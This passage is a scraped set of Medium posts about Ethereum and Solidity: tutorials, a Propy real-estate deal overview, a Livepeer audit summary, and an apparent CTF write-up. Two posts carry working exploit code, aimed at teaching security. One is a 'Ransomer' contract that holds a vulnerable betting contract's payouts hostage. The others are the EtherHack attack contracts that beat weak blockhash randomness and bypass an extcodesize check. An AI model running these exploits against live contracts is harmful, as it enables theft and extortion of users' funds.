"claps": 67, "voters": 11, "content": "Writing Software Contracts for Ethereum \u2014 Part 2Satish Manohar TalimFollowAug 4, 2017 \u00b7 8 min read(Updated on 3rd Feb. 2018)In Part 1 we talked about the basics of Blockchain.In Part 3 we will setup our private blockchain using geth.What are Smart Contracts?1. Smart-contracts are a way for people all across the globe to do business with each other even if they don\u2019t speak the same language or use the same currency. Smart contracts help you exchange money, property, shares, or anything of value in a transparent, conflict-free way, while avoiding the services of a middleman.2. The best way to describe smart contracts is to compare the technology to a vending machine. Ordinarily, you would go to a lawyer or a notary, pay them, and wait while you get the document. With smart contracts, you simply drop a cryptocurrency into the vending machine (i.e. ledger), and your driver\u2019s license, or whatever drops into your account. More so, smart contracts not only define the rules and penalties around an agreement in the same way that a traditional contract does, but also automatically enforce those obligations.3. Smart contracts are a series of instructions, written using the programming language \u201cSolidity\u201d, which work on the basis of the IFTTT logic aka the IF-THIS-THEN-THAT logic.4. You can use smart contracts for all sort of situations that range from financial derivatives to insurance premiums, breach contracts, property law, credit enforcement, financial services, legal processes and crowd funding agreements.Smart Contract \u2014 image courtesy BlockgeekThree companies to watch are:RSKRSK, bitcoin\u00b4s smart contract platform.www.rsk.coBalanc3Balanc3 -- a ConsenSys formation -- has been working in stealth for over a year to build out a blockchain-based\u2026www.linkedin.comMonaxBusinesses use blockchain, smart contract, and distributed storage technologies to share data, eliminate redundancy and\u2026monax.ioEthereum software: geth, eth, pyethappThe official Ethereum clients are all open source \u2014 that is you can see the code behind them, and tweak them to make your own versions. The most popular clients are:1. geth (written in a language called Go) https://github.com/ethereum/go-ethereum geth is the entry point into the Ethereum network (main-, test- or private net), capable of running as a full node (default) archive node (retaining all historical state) or a light node (retrieving data live).2. eth (written in C++) https://github.com/ethereum/cpp-ethereum3. pyethapp (written in Python) https://github.com/ethereum/pyethappThese are all command-line based programs (think green text on black backgrounds) and so additional software can be used for a nicer graphical interface.A popular Ethereum browser is the Mist browser which is fast and a secure way of interacting with the Ethereum network.The most widely used Ethereum client (geth) is written in Go, which means there should be a nice ecosystem for interacting with Ethereum and smart contracts using Go with nice features such as code-generation and reusable helpers from shared libraries. We shall explore this in the forthcoming articles.Smart Contract languages: Solidity / Serpent, LLLThere are three common languages smart contracts are written in, which can be compiled into smart contracts and run on Ethereum Virtual Machines. They are:Solidity \u2014 looks a little bit like Javascript. This is currently the most popular and functional smart contract scripting language.Serpent \u2014 similar to the language Python, and was popular in the early history of Ethereum. However, it is due for retirement soon.LLL (Lisp Like Language) \u2014 similar to Lisp and was only really used in the very early days. It is probably the hardest to write in.All the above languages can be compiled into EVM bytecode.Let\u2019s understand and start learning the Solidity languageSolidity is a contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed to target the Ethereum Virtual Machine (EVM).Solidity Language itself is a tool that we use to generate machine-level code that can execute on the EVM, it\u2019s a language with a compiler which takes our high-level human-readable code and breaks it down into simple instructions. Here\u2019s a list of all available opcodes.Solidity is statically typed (the type of the variable will be determined at compile time and not at run time), supports inheritance, libraries and complex user-defined types among other features.Solidity has .sol as a file extension.To learn Solidity you don\u2019t need an Ethereum node to write and deploy smart contracts. The best way to try out Solidity for small contracts right now, is using Remix \u2014 a browser-based IDE with integrated compiler and Solidity runtime environment without server-side components.A Simple Smart Contract On EthereumLet us begin with a simple smart contract example MessageContract.sol where we learn how to write Getters and Setters in Solidity.MessageContract.solUsing RemixClick on the + button at the top leftLoad Remix and you will see on the left side a button to load new solidity files; in the center you have the code window and on the right side you can see the control elements that has tabs for Run, Compile etc. Now click on the + button at the top left and give the name as MessageContract.sol Press OK.Copy the above code i.e. MessageContract.sol into Remix\u2019s middle window.Click on the Run button on the top right and it will show you the current environment. We will use the JavaScript VM where everything is local and in memory only. Also, you can see that it gives you several accounts for testing. Now, click on the pink colored Create button.Click on the Create button to execute your codeYou should see a getMessage button in blue (that\u2019s the getter) and the setMessage in pink (that\u2019s the setter). Enter \u201csome text\u201d in double quotes in the setMessage text area and press the setMessage button. The new value is now set. If you press the getMessage button you should now see \u201csome text\u201d.Let us try and understand what we are doing inside the above program.Understanding Soliditypragma:Source files can (and should) be annotated with a so-called version pragma to reject being compiled with future compiler versions that might introduce incompatible changes.The version pragma is used as follows:pragma solidity ^0.4.0;Such a source file will not compile with a compiler earlier than version 0.4.0 and it will also not work on a compiler starting from version 0.5.0 (this second condition is added by using ^).Structure of a Contract:The Solidity docs say \u201cContracts in Solidity are similar to classes in object-oriented languages\u201d that resides at a specific address on the Ethereum blockchain.Each contract can contain declarations of State Variables, Functions, Function Modifiers, Events, Structs Types and Enum Types (more on these later).Furthermore, contracts can inherit from other contracts. An interesting read is related to the second biggest ETH theft of all time that was basically triggered by inheritance (via delegation).Code Layout:Indentation \u2014 Use 4 spaces per indentation level.Tabs or Spaces \u2014 Spaces are the preferred indentation method. Mixing tabs and spaces should be avoided.Source File Encoding \u2014 UTF-8 or ASCII encoding is preferred.Comments \u2014 Single-line comments (//) and multi-line comments (/*\u2026*/) are possible.// This is a single-line comment./*This is amulti-line comment.*/Naming Conventions:Contracts and libraries should be named using the CamelCase style (CamelCase is a naming convention in which a name is formed of multiple words that are joined together as a single word with the first letter of each of the multiple words capitalized so that each word that makes up the name can easily be read. The name derives from the hump or humps that seem to appear in any CamelCase name. In UpperCamelCase, the first letter of the new word is upper case, allowing it to be easily distinguished from a lowerCamelCase name, in which the first letter of the first name is lower case.). In the code above, we have contract MessageContractFunction Names should use mixedCase (lowerCamelCase name). In the code above, we have a function getMessage()String Literals:String literals are written with either double or single-quotes, for example \u201cHello World\u201dA convention is that strings should be quoted with double-quotes instead of single-quotes.string:It\u2019s a dynamic sized unicode string assumed to be UTF-8 encoded.In Solidity one requires to mention the type of variable, in our case string message.Statement:A basic statement would setup a variable (message in our case) and give it a value. This type of a statement is called an assignment statement because it sets a value on a variable.string message = \u201cHello World\u201d;All statements must end in a semicolon (;).Functions:For short function declarations, it is recommended:for the opening brace of the function body to be kept on the same line as the function declaration.The closing brace should be at the same indentation level as the function declaration.The opening brace should be preceded by a single space.When declaring short functions with a single statement, it is permissible to do it on a single line. For example:function shortFunction() { doSomething(); }There are four types of visibilities for functions: external, public, internal or private, where the default ispublic. Do note that different visibility levels will not \u201chide\u201d your code from others, but just prevent other contracts from calling them. The visibility specifier is given after the type for state variables and between parameter list and return parameter list for functions.State Variables:There are three types of visibilities for state variables: public, internal or private, where the default is internal (these functions and state variables can only be accessed internally i.e. from within the current contract or contracts deriving from it).State variables can be declared as constant. In this case, they have to be assigned from an expression which is a constant at compile time.The compiler does not reserve a storage slot for these constant state variables, and every occurrence is replaced by the respective constant expression (which might be computed to a single value by the optimizer).Not all types for constants are implemented at this time. The only supported types are value types and strings.The visibility specifier is given after the type for state variables and between parameter list and return parameter list for functions.Note: If you make your state variables public \u2014 the compiler will create getters for you automatically.ResourcesVideos:What is a Smart Contract? A Beginner\u2019s GuideWhat is a blockchain smart contract?Beginner\u2019s Guide: Smart Contracts Programming Tutorial in SolidityLinks:Style GuideCreditsThank you Michael Kohl for reviewing this article and offering suggestions. Much appreciated.", "responses": 1, "tags": ["Solidity", "Smart Contracts", "Tutorial", "Technology", "Smart Contracts Tutorial"]}, {"title": "What Every Techie Wants To Know About The First Blockchain Transaction In The EU", "post_link": "https://medium.com/propy/how-to-process-international-property-transactions-using-propy-and-decentralized-technologies-78d7239a2a54?source=search_post", "author_name": "Propy", "author_link": "https://medium.com/@propy", "publish_date": "2018-10-31", "last_modified_date": "2019-02-22", "readtime": "5.38", "claps": 138, "voters": 12, "content": "What Every Techie Wants To Know About The First Blockchain Transaction In The EUPropyFollowOct 31, 2018 \u00b7 6 min readProperty investors want fast, easy deals for in-demand locations. Yet, until now, it\u2019s been hard for anyone to buy a property remotely. By integrating decentralized technologies like smart contracts into the real estate sales process, Propy.com removes the complications. Secure transactions can be made across borders, without the traditional long delays that frustrate buyers.Seville, Spain, is one of the hottest real estate markets in the world right now. A French buyer recently used our platform to buy a property there.How do we do it? We\u2019ll show you exactly how we use smart contracts on the Ethereum blockchain to:Make real estate deals more efficientProvide a transparent sales process that is not open to manipulationStore immutable records on the blockchain, which is more secure than traditional paper recordsWe\u2019ll share an overview of the suite of smart contracts at Propy, and go through how a deal is processed, step-by-step, from that perspective.For a broader overview of how the Propy transaction platform works, check out our video explaining the transaction platform. With our user-friendly web interface, users can complete real estate deals with no blockchain knowledge.(Note that the video describes the California workflow, so the documents and roles involved are a bit different than those for this deal in Spain)How Propy Sells Real Estate on the BlockchainEach property deal is represented by its own self-contained group of smart contracts on the Ethereum blockchain. We\u2019ve designed the system to be flexible, with contracts interacting with each other via generic interfaces that allow a lot of room for different contract implementations going forward. There are three smart contracts that make up a deal: Deed, Property, and Escrow.Deed Smart ContractDeed contracts define the terms and parties of the deal. They track the flow of events as the deal happens. The hashes of all relevant signed documents are stored here as an immutable record.Property Smart ContractProperty contracts contain metadata about the property\u2019s physical characteristics, such as its physical address and measured area. They also maintain a record of property owners and transfers of ownership.Escrow Smart ContractEscrow contracts track the flow of money. There are many potential types of escrow contracts and the process is handled slightly differently for different currencies.For example, if ETH is used for the transaction (as was the case for this Seville deal), the Escrow contract itself can hold the funds until conditions for their release have been met.For other currencies (like USD and BTC), the transfer of money happens through separate systems and the Escrow contract serves more as a record of events.The Propy RegistryBefore going further into the flow of the deal, it\u2019s important to note how the Deed, Property, and Escrow contracts are created and managed. The Propy Registry suite of contracts is the hub that keeps track of all Deed and Property contracts, manages users and their roles (such as notary, agent, buyer, or seller), and provides a central place for interacting with all aspects of the system.The Propy Registry is made up of a significant number of components, and it\u2019s designed to be flexible and upgradable. Essentially, it\u2019s used to set up the contracts, users, and parameters for each deal.The Flow of the DealA deal begins when a potential buyer finds a property on the Propy Listings Platform and contacts one of the agents assigned to the property. The buyer officially starts the process by sending a deposit, which reserves the property for the deal. After the buyer reserves the property, other participants get invited to close the deal and our smart contracts become involved.First, the Deed, Property, and Escrow contracts are created by the Propy Registry system. It\u2019s also possible that a Property contract already exists for the property in question. In this case, the existing Property contract would be used.As an aside, here are the Ethereum addresses of the smart contracts for this Seville deal:Deed contract: 0xc1e63555628be09bed9e1cc086c4db919bd0b68fProperty contract: 0xB8c63aeE7A399CE1729F0FfdaDEC19F4b1A8594AEscrow contract: 0x99F82dFf6e94F589A786c6063f14bCD9BFf17cA8After the contracts are created, the Deed contract is initialized with information about the parties involved (such as who the agents, buyer, and seller are), the sale price, and the required documents/signatures for the deal.The required documents/signatures for the deal are set up into a series of steps that must be progressed through in order for the deal to go through. Actions are then taken to move the deal forward through these steps. Each step requires certain conditions to be met, which includes the corresponding documents being signed and uploaded.Documents are signed using DocuSign, which is integrated into our transaction platform. Prior to signing, the paperwork is verified by the Propy legal team. In the future, we\u2019re planning to handle document signatures on an Ethereum-based platform.The hash of each document is stored in the Deed contract, which provides a verifiable record for any parties who have the original document.Currently, the documents themselves are stored by Propy. We\u2019re looking to provide a decentralized file storage solution in the future.For this deal in Seville, three of these steps were required, involving the signing & uploading of a Nota Simple (Property Registry Filing in English), a Gastos de Comunidad (HOA Fees Agreement), and the Escritura itself (Deed).Once all the required documents are signed and uploaded to the satisfaction of all parties, the buyer deposits the funding required into whatever escrow system is being used. This is recorded by the Escrow contract.At this point, we\u2019re almost ready to officially transfer ownership.Propy FeeThere is a fee to buy a property using our service. This fee is paid in PRO tokens and is divided between the Network Growth Pool wallet and the Propy wallet. The amount of tokens that will go to each is clearly defined in the Deed contract. The Network Growth Pool is used to incentivize the engagement of users in the platform in an automatic and transparently auditable way. It\u2019s also used to incentivize governments and other related institutional actors to use the platform. You can read more on cryptoeconomics and the Network Growth Pool here.To pay the fee, the buyer sends PRO tokens to the Deed contract\u2019s address. Then, the Deed contract can distribute the tokens between the two wallets as defined in its terms.Once the fee is paid, ownership of the property can be officially transferred on the blockchain. The notary who was a participant in the transaction platform and thus smart contracts records the deal to the government registry as well.Each of the three smart contracts plays a role in the ownership transfer process. The Deed contract enters a finished state and records that the deal is complete. The Escrow contract releases the funds to the seller (if the deal was done in ETH), or records that the money was transferred successfully (if the deal was done in another currency). The Property contract records the Ethereum address of the new owner.Join the Real Estate RevolutionPropy is automating real estate. We make transactions faster, simpler, and more secure. If you\u2019re a developer interested in working on global problems, get in touch. You can contact our world-class technology team on info@propy.com.Read more about the Seville blockchain property dealWritten by Thomas Spofford, Solidity Engineer at Propy", "responses": 0, "tags": ["Real Estate", "Smart Contracts", "Solidity", "Sevilla", "Proptech"]}, {"title": "Ethereum smart contract tutorial [lunch-break series] (1): Custodian Contract", "post_link": "https://medium.com/taipei-ethereum-meetup/ethereum-smart-contract-tutorial-lunch-break-series-1-custodian-contract-381bb79053fe?source=search_post", "author_name": "Jeff Hu", "author_link": "https://medium.com/@jj1385jeff850527", "publish_date": "2017-08-06", "last_modified_date": "2018-11-26", "readtime": "2.40", "claps": 398, "voters": 16, "content": "Ethereum smart contract tutorial [lunch-break series] (1): Custodian ContractJeff HuFollowAug 6, 2017 \u00b7 3 min readFrom my rough understanding, and the wisdom of the crowds, it is unpractical to record/count the times that a contract has been instantiated. But what if this information is indispensable for the project to proceed? That is when the Custodian Contract comes into play.Apologize upfront for naming this simple concept as such a strong phrase ;pCustodian Contract: Noun. A solidity contract who is eligible to supervise or oversee the other contract, or a collection of contracts. The simplest usage is to count the existences(number of instances) of the contract that is under custody.What you need?Solidity, truffle and testrpcGet started!Create a new directory named custody-contract/ or any name you prefer.Start off testrpc in custody-contract/ by terminal and open the other terminal to do truffle init inside custody-contract/# Note: If you think I start to babble on meaningless words and probably go crazy, then you might want to visit my previous tutorial asap. :)Create child contractChild contract is the contract that doomed to be oversaw. It has only one method that proves its liveness.pragma solidity ^0.4.13;contract Child {  function alive() public returns (bool) {    return true;  }}<Tips>:pragma: This annotation prevents the compilation of future-version compiler which might lead to incompatibility of codes.Create custody contractCustody contract looks like below:pragma solidity ^0.4.13;import \"./Child.sol\";contract Custodian {  uint public counter;event Birth(uint _counter, address _child);function Monitor() public {    counter = 0;  }function createChild() public returns (address) {    ++counter;    Child child = new Child();    Birth(counter, child);    return child;  }}<Tips>:event: It is always a good habit to do logging. Event provides similar functionality that allows being triggered within contract method, and being captured on the side of Javascript (not included in this tutorial).import: By importing the other contract, Child.sol in this case, this contract can interact with the imported contract.DeployChange the migrations/2_deploy_contracts.js to the following:var Custodian = artifacts.require(\"./Custodian.sol\");var Child = artifacts.require(\"./Child.sol\");module.exports = function(deployer) {  deployer.deploy(Custodian);  deployer.deploy(Child);};Let\u2019s run truffle console, and deploy to finish up the deployments.Try outThis gonna be the fun part of this tutorial. To begin with, let\u2019s get the instance of Custodian.sol first.Custodian.new().then(obj=>custodian=obj)We know the codes below will return the address of the new Child instance:custodian.createChild.sendTransaction({from:web3.eth.coinbase})# Note: web3.eth.coinbase is the address of the first account, as well as the address where the reward of mining will go to.Check whether the counter of custodian has incremented by 1.custodian.counter.call()In order to retrieve the Child instance and change the state of custodian at a time, we should do:Child.new(custodian.createChild.sendTransaction({from:web3.eth.coinbase})).then(obj=>child=obj)Now let\u2019s check whether the child is working by:child.alive.call()    // Should return trueLastly check the counter of custodian to see if the afore-created Child are successfully recorded.custodian.counter.call()    // Should be 2Wrap upThis tutorial offers only extremely basic idea on how two contracts can interact unilaterally, in order to mimic the custody relationship. There could be more use cases for you to explore and realize.Thanks for your time~All the codes can be found here.", "responses": 0, "tags": ["Ethereum", "Smart Contracts", "Solidity", "Truffle", "Custody"]}, {"title": "Livepeer Smart Contract Security Audit #1 Results", "post_link": "https://medium.com/livepeer-blog/livepeer-smart-contract-security-audit-1-results-631c4d7d98a4?source=search_post", "author_name": "Doug Petkanics", "author_link": "https://medium.com/@petkanics", "publish_date": "2018-03-14", "last_modified_date": "2018-04-11", "readtime": "2.66", "claps": 64, "voters": 11, "content": "Livepeer Smart Contract Security Audit #1 ResultsDoug PetkanicsFollowMar 14, 2018 \u00b7 3 min readPrior to launching Livepeer on Ethereum\u2019s MainNet network, we felt it important to conduct significant internal testing across multiple networks, complete a round of internal security audits, and work with an external 3rd party security firm to audit and do a security review of the Livepeer smart contracts. We worked with Trail of Bits (ToB) over the course of a couple weeks, and they recently completed their audit.You can read the full Livepeer audit report by Trail of Bits here.In summary, ToB dug deep into the inner workings of the Livepeer protocol and smart contracts. They covered many different areas using both automated tools, custom written tests, and manual inspection and debugging. The report that they produced included:3 potential low severity issues2 potential informational issues0 medium or high severity issues2 code maintainability recommendations.After discussions and recap, Livepeer has produced a response to each of the reported issues, along with a few short term actions.Read Livepeer\u2019s detailed technical response here.In light of the findings and response, Livepeer is in a better place to move forward with its upcoming network launch, knowing that the project has worked with talented external security researchers in an attempt to exploit the protocol. Zero of the reported issues are blockers for the upcoming alpha, but all are positive recommendations for future iteration. Livepeer will continue to engage external security partners going forward as it deploys significant upgrades to the network and iterates over time. For more details around the goals and execution of the audit process, read on.Trail of BitsAfter an extensive outreach and educational process around evaluating different potential security partners, Livepeer was excited to have selected Trail of Bits as its first external audit partner for the following reasons.They were an existing security firm of professionals which predated the recent boom of Ethereum and Solidity smart contract audits.They have a positive recent track record in the Ethereum, EVM, and blockchain world, having recently run audits for MakerDAO, Parity, and RSK.They have built and contributed open source tools to the security research world including Manticore and Echidna.Positive recommendations and reference checks.Significant track record of community engagement including research publications and security conference presentations.Professional and responsible communication, organization, management, and execution. The quote and work were on time and on budget.Audit GoalsToB understood that Livepeer would be rolling out gradually over time and iterating frequently. Since protocol upgrade and parameter upgrade mechanisms were built in, the goals of the audit were less about giving the current code base the full stamp of approval, and more about making sure the important mechanisms that enable upgrades, bug fixes, iteration, and protect user value were in place. The audit primarily was aimed to focus on three areas:Liveness \u2014 the Livepeer protocol progresses in rounds, and each round needs to be initialized in order for broadcast jobs to be sumitted and rewards to be earned. Can anything halt this process and \u201cfreeze\u201d the protocol?Ownership \u2014 during the iterative period and gradual network rollout, the core team can update economic parameter values, fix bugs, and deploy smart contract upgrades. Are there any ownership vulnerabilities that allow a malicious actor to access these capabilities?Value \u2014 users stake tokens into Livepeer smart contracts in order to do work on the network. Can anything put this user value at risk such that it can get locked up or stolen?ToB lead with a focus on these areas, but was also able to touch on many others including job and rounds management, bonding, deep dives into on chain data structures, and the earnings distribution functions.See the full report for detailed findings. As Livepeer goes to mainnet and iterates on its protocol, look for opportunities to participate in security reviews through potential bug bounty and development bounty programs.", "responses": 2, "tags": ["Blockchain", "Livepeer", "Ethereum", "Security", "Solidity"]}, {"title": "Provably Fair Ransom", "post_link": "https://medium.com/consensys-diligence/provable-fair-ransom-1547ba894d0?source=search_post", "author_name": "Steve Marx", "author_link": "https://medium.com/@smarx", "publish_date": "2019-05-22", "last_modified_date": "2019-08-17", "readtime": "3.29", "claps": 157, "voters": 11, "content": "Provably Fair RansomSteve MarxFollowMay 22 \u00b7 4 min readimage courtesy of www.ransomizer.comRansom has a trust problem. Suppose I\u2019ve birdnapped your beloved pet parakeet and am demanding a $1,000 ransom to return the bird to you. You could pay the ransom, but how do you know I\u2019ll actually return the parakeet? Alternatively, we could agree that you\u2019ll pay after I return the parakeet, but then how do I know you\u2019ll follow through?Smart contracts are a tool for solving this sort of trust problem. In this article, I\u2019ll show how a common security vulnerability leads to a ransom opportunity and how that ransom can be made trustless by using a smart contract.Failed TransfersBelow is a smart contract for parimutuel betting on whether a future block hash will be odd or even. It suffers from a very common vulnerability:contract VulnerableBlockhashBet {    uint256 public blockNumber = block.number + 1000;    uint256[2] amountBet;        struct Bet {        address payable bettor;        uint256 amount;     }    Bet[][2] public bets;    function bet(uint256 choice) external payable {        require(block.number < blockNumber, \"Too late.\");        require(msg.value > 0, \"Must bet something.\");        require(bets[choice].length < 50, \"Too many bets.\");                amountBet[choice] += msg.value;        bets[choice].push(Bet(msg.sender, msg.value));    }    function resolve() external payable {        require(blockhash(blockNumber) != 0, \"Hash unavailable.\");        uint256 totalBet = amountBet[0] + amountBet[1];        uint256 winner = uint256(blockhash(blockNumber)) % 2;        for (uint256 i = 0; i < bets[winner].length; i++) {            uint256 amount = bets[winner][i].amount *                totalBet / amountBet[winner];            address payable bettor = bets[winner][i].bettor;            delete bets[winner][i];            bettor.transfer(amount);        }    }}This contract is vulnerable to SWC-113: DoS with Failed Call. If any individual transfer in the resolve function fails, the entire transaction will be reverted, and no one will receive their ether. A common reason for such a transfer to fail is that the recipient is a smart contract that lacks a payable fallback function.Unlike many instances of this flaw, this particular vulnerability doesn\u2019t look very important. Sure, it\u2019s undesirable that one bad recipient can block everyone else from receiving their ether, but why would someone do that? They would be costing themselves ether just like everyone else, so there appears to be no motivation for an attacker.Even without the assumption of malice, this vulnerability is worth fixing just because of the possibility of someone accidentally breaking things with a poorly implemented wallet. Besides, fixing this sort of problem is easy.RansomI said there appears to be no motivation for someone to block the VulnerableBlockhashBet contract, but there is an interesting ransom opportunity. A malicious bettor could participate in the bet via a smart contract that conditionally refuses ether. They can then contact the other recipients and make a ransom demand: \u201cGive me an ether or no one gets paid.\u201d// Prevent inbound transfers until someone pays a ransom.contract Ransomer {    address owner = msg.sender;    bool locked = true;    // We're betting 2 wei, which we don't care about getting back.    constructor(VulnerableBlockhashBet target) public payable {        target.bet.value(1)(0);        target.bet.value(1)(1);    }    // Block incoming transfers until ransom is paid.        function() external payable {        require(!locked, \"Pay the ransom first!\");    }     // Called by contract owner when ransom has been paid.       function unblock() external {        require(msg.sender == owner);        locked = false;    }}This contract bets on both outcomes so it\u2019s guaranteed to be paid in the vulnerable contract\u2019s resolve function. The contract\u2019s payable fallback function reverts all transactions until unblock has been called. This means no winning bets will be paid out until the attacker allows it.But just as in the case of the parakeet, we have to think about the trust problem. If we pay the attacker the ransom, how do we know they will actually call unblock? Reputation concerns aside, they have no incentive to do so. In fact, calling unblock will cost the attacker a transaction fee. They may instead demand a second ransom or simply walk away.Trustless RansomWe can make the ransom scheme trustless by encoding the ransom logic into the smart contract itself:// Prevent inbound transfers until someone pays a ransom.contract Ransomer {    address owner = msg.sender;    bool locked = true;    // We're betting 2 wei, which we don't care about getting back.    constructor(VulnerableBlockhashBet target) public payable {        target.bet.value(1)(0);        target.bet.value(1)(1);    }    // Block incoming ether until ransom is paid.        function() external payable {        require(!locked, \"Pay the ransom first!\");    }     // Anyone can unblock by paying the ransom.    function payRansom() external payable {        require(msg.value >= 1 ether);        locked = false;    }        // Collect the ransom (and any other received funds).    function collect() external {        require(msg.sender == owner);        msg.sender.transfer(address(this).balance);    }}With this contract, there\u2019s no need to trust the ransomer. All participants know that as soon as the ransom is paid, the VulnerableBlockhashBet contract\u2019s resolve function will start working.Closing thoughtsBe careful about dismissing a vulnerability because there\u2019s no obvious motivation for someone to exploit it. Not only can a vulnerability be exploited \u201cfor the lulz\u201d or even accidentally, but sometimes there are creative avenues for profiting from a vulnerability that aren\u2019t immediately apparent.", "responses": 1, "tags": ["Ethereum", "Security", "Smart Contracts", "Solidity"]}, {"title": "State Channels for Babies, Part 2", "post_link": "https://medium.com/blockchannel/state-channels-for-babies-part-2-40e6b2ebec42?source=search_post", "author_name": "BlockChannel", "author_link": "https://medium.com/@BlockChannel", "publish_date": "2018-08-03", "last_modified_date": "2018-08-03", "readtime": "2.59", "claps": 142, "voters": 12, "content": "State Channels for Babies, Part 2They Grow Up So FastBlockChannelFollowAug 3, 2018 \u00b7 3 min readCross-Post: This post was originally written by Hunter Hillman, and was republished from the Connext blog with their explicit permission.Okay, maybe this one is for toddlers.In our last installment, we introduced the basic principles of state channels \u2014 what they are, and how they can help make blockchains more accessible. However, we skimmed over the details of how they work and where state channel research is headed.This week, we take a deeper look at state channel architecture: how channels are opened, the differences between payment channels and state channels, and counterfactual instantiation.We rely on terms and definitions from previous chapters, so if you haven\u2019t already read them, take a look at our first two posts:Blockchains for BabiesState Channels for Babies Pt.1Without further ado, we present:", "responses": 0, "tags": ["Blockchain", "Ethereum", "Solidity", "State Channels", "Scalability"]}, {"title": "State Channels for Babies, Part 3", "post_link": "https://medium.com/blockchannel/state-channels-for-babies-part-3-5ecc2867a17b?source=search_post", "author_name": "BlockChannel", "author_link": "https://medium.com/@BlockChannel", "publish_date": "2018-09-01", "last_modified_date": "2018-09-01", "readtime": "3.13", "claps": 101, "voters": 12, "content": "State Channels for Babies, Part 3Putting All The Pieces TogetherBlockChannelFollowSep 1, 2018 \u00b7 4 min readCross-Post: This post was originally written by Hunter Hillman, and was republished from the Connext blog with their explicit permission.This is the last one on state channels, we promise!In previous installments, we introduced you to state channels and dug a little deeper into what makes them tick.This week, we\u2019re going to take a dive into the architecture of \u201cmultihop\u201d payments and a few different strategies for implementing them.We rely on terms and definitions from previous chapters, so if you haven\u2019t already read them, take a look at our first two posts:Blockchains for BabiesState Channels for Babies Part 1State Channels for Babies Part 2There are many ways to illustrate and educate the community on state channels. Existing state channels information remains somewhat esoteric, but it is important we disseminate this knowledge in a multitude of ways so that more people can grasp where we are in terms of scalability.For a more in-depth look, check out the Counterfactual for Dummies and State Channels for Dummies series by Eric Olszewski.Without further ado, we present:", "responses": 0, "tags": ["Ethereum", "State Channels", "Blockchain", "Solidity", "Development"]}, {"title": "PHDays 8: EtherHack Contest Writeup", "post_link": "https://blog.positive.com/phdays-8-etherhack-contest-writeup-794523f01248?source=search_post", "author_name": "Arseny Reutov", "author_link": "https://blog.positive.com/@theRaz0r", "publish_date": "2018-05-22", "last_modified_date": "2018-10-05", "readtime": "8.58", "claps": 36, "voters": 10, "content": "PHDays 8: EtherHack Contest WriteupArseny ReutovFollowMay 22, 2018 \u00b7 9 min readThis year at PHDays security conference a new contest called EtherHack was held. The goal was to be the first to solve all tasks which featured smart contract vulnerabilities. Here we present the detailed explanation of intended solutions.Azino 777The goal of this level is to win the lottery and hit the jackpot!The first three tasks featured bad randomness issues that were covered in our recent research \u201cPredicting Random Numbers in Ethereum Smart Contracts\u201d. The first task being the easiest one had a PRNG that relied on the blockhash of the last block and used it as a source of entropy for random numbers:As the result of block.blockhash(block.number-1) would be the same for any transaction within the same block, the attack assumed the use of an exploit contract with the same rand() function that called the target contract via an internal message:function WeakRandomAttack(address _target) public payable {    target = Azino777(_target);}function attack() public {    uint256 num = rand(100);    target.spin.value(0.01 ether)(num);}Private RyanWe added a private seed, nobody will ever learn it!This task was a bit tougher variation of the previous one. A variable seed deemed private was used as an offset to a block.number so that the blockhash would not be bound to the previous block. After each bet seed would be overwritten with a new \u201crandom\u201d value. This was the case of Slotthereum lottery.contract PrivateRyan {  uint private seed = 1;  function PrivateRyan() {    seed = rand(256);  }  function spin(uint256 bet) public payable {    require(msg.value >= 0.01 ether);    uint256 num = rand(100);    seed = rand(256);    if(num == bet) {        msg.sender.transfer(this.balance);    }  }  /* ... */}Similarly to the previous task, a successful attacker would just need to copy the rand() function into the exploit contract, but this time the value of private variableseed should have been obtained off-chain and then supplied to the exploit as an argument. To do so, one could take advantage of web3.eth.getStorageAt() method of web3 library:Reading contract storage off-chain to obtain the seedWhen we\u2019ve got the seed, all one need to do is just supply it to practically the same exploit as in the first task:contract PrivateRyanAttack {  PrivateRyan target;  uint private seed;  function PrivateRyanAttack(address _target, uint _seed) public payable {    target = PrivateRyan(_target);    seed = _seed;  }  function attack() public {    uint256 num = rand(100);    target.spin.value(0.01 ether)(num);  }  /* ... */}Wheel of FortuneThis lottery uses blockhash of a future block, try to beat it!As per task description, the goal was to predict the blockhash of a block whose number was saved in the Game structure upon the bet occurred. This blockhash was then retrieved to generate a random number when a subsequent bet was made.There were two possible solutions:one could call the target contract two times from exploit contract, the first call would result in block.blockhash(block.number) being always zeroone could wait for 256 blocks to be mined before making the second bet, so that blockhash of the saved block.number would give a zero due to EVM limitations of the number of available blockhashesIn both cases the winning bet would be uint256(keccak256(bytes32(0))) % 100 or \u201c47\u201d.Call Me MaybeThis contract does not like when other contracts are calling it.One way to protect the contract from being called by other contracts is to use the extcodesize EVM assembly instruction which returns the size of the contract specified by its address. The technique is to use this opcode in inline assembly against msg.sender\u2019s address. If the size for the address is greater than zero, then msg.sender is a contract since normal addresses in Ethereum do not have any associated code. The task used exactly this approach to prevent other contracts from calling it.Transaction property tx.origin refers to the original issuer of the transaction while msg.sender points to the last caller. If we send the transaction from the normal address, these variables will be equal and we will end up with a revert(). That is why in order to solve the challenge one needed to bypass extcodesize check so that tx.origin and msg.sender would differ. Luckily, there is a nice EVM peculiarity that could help to achieve this:Indeed, at the moment when a newly deployed contract calls another contract in its constructor it does not yet exist on the blockchain, it acts as a wallet only. Hence, it does not have associated code and extcodesize would yield zero:contract CallMeMaybeAttack {    function CallMeMaybeAttack(CallMeMaybe _target) payable {        _target.HereIsMyNumber();    }    function() payable {}}The LockThe lock is\u2026 locked! Try to find the correct pincode via unlock(bytes4 pincode) function. Each unlock attempt costs 0.5 ether!This task didn\u2019t reveal any piece of code so the participants had to reverse engineer the smart contract bytecode in order to solve the challenge. One of the ways to achieve this was to use radare2 framework which supports EVM disassembly and debugging.Firstly, let\u2019s deploy the task instance and submit a random guess:await contract.unlock(\"1337\", {value: 500000000000000000}) \u2192falseWell, it was a solid attempt, but we didn\u2019t have much luck. Let\u2019s try to debug this transaction.r2 -a evm -D evm \"evm://localhost:8545@0xf7dd5ca9d18091d17950b5ecad5997eacae0a7b9cff45fba46c4d302cf6c17b7\"Here we instruct radare2 to use \u201cevm\u201d architecture. The tool then connects to the specified full node and retrieves VM trace of that transaction. At this point we are all set to dive into the EVM bytecode.The first thing we have to do is to perform analysis:[0x00000000]> aa[x] Analyze all flags starting with sym. and entry0 (aa)Then we disassemble the first 1000 instructions (should be enough to cover the whole contract) with pd 1000 and switch to graph view with VV.EVM bytecode compiled with solc usually starts with a function dispatcher which decides which function to call based on the first 4 bytes of call data which is a function signature defined as bytes4(sha3(function_name(params))) . The function of interest for us is 